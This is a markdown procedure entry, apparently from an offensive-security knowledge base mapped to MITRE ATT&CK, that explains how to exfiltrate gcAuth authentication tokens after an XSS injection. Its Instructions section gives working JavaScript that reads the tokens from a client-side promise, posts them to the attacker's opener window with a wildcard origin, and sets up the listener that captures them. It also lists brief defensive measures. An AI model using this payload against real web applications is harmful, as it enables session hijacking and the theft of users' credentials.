---
id: proc-exfiltrate-tokens-xss-900619
tags:
  - token-theft
  - exfiltration
  - gcAuth
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/retrieve-and-post-gcAuth-tokens]]'
  - '[[commands/setup-message-event-listener]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-13T23:55:37.709Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
---
# Exfiltrate Authentication Tokens via XSS Payload

## Summary

This procedure uses the injected XSS payload to retrieve gcAuth authentication tokens from the preflightRunner promise and exfiltrate them via postMessage back to the opener window, where they can be captured and displayed.

## Description

Once the XSS executes in the onerror handler, it accesses valkyrie.transact.preflightRunner.getPromise("gcAuth") to fetch tokens, stringifies the object, and sends it to window.opener. The malicious page listens for this message to log/alert the data. This enables theft of session-bound credentials on web platforms.

## Requirements

1. Successful XSS injection from prior step
2. Opener window with message listener active
3. Authenticated session with gcAuth promise available

## Defense

Defensive measures and detection strategies:

- Avoid exposing promises like gcAuth in client-side code
- Use secure token storage (e.g., HttpOnly cookies) not accessible via JS
- Monitor for anomalous postMessage traffic between windows

## Objectives

1. Retrieve sensitive authentication data via JS execution
2. Exfiltrate tokens to attacker-controlled context
3. Enable session hijacking or further compromise

## Instructions

### Step 1: Trigger Payload Execution

**Context**: The XSS payload runs automatically on injection.

The injected code uses [[commands/retrieve-and-post-gcAuth-tokens]]:

```javascript
valkyrie.transact.preflightRunner.getPromise("gcAuth").then((gcAuth)=> window.opener.postMessage(JSON.stringify(gcAuth),"*"));
```

> Promise resolves, tokens posted to opener.

### Step 2: Receive Exfiltrated Data

**Context**: Capture the sent message on the malicious page.

Ensure [[commands/setup-message-event-listener]] is active:

```javascript
window.addEventListener("message",(msg)=>{ console.log("got message", msg); alert(msg.data); });
```

> Logs and alerts the JSON-stringified gcAuth object.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Steal Web Session Cookie]]

### Sub-Techniques


## Commands Used

- [[commands/retrieve-and-post-gcAuth-tokens]]
- [[commands/setup-message-event-listener]]

## Tools Used


## Tags

- token-theft
- exfiltration
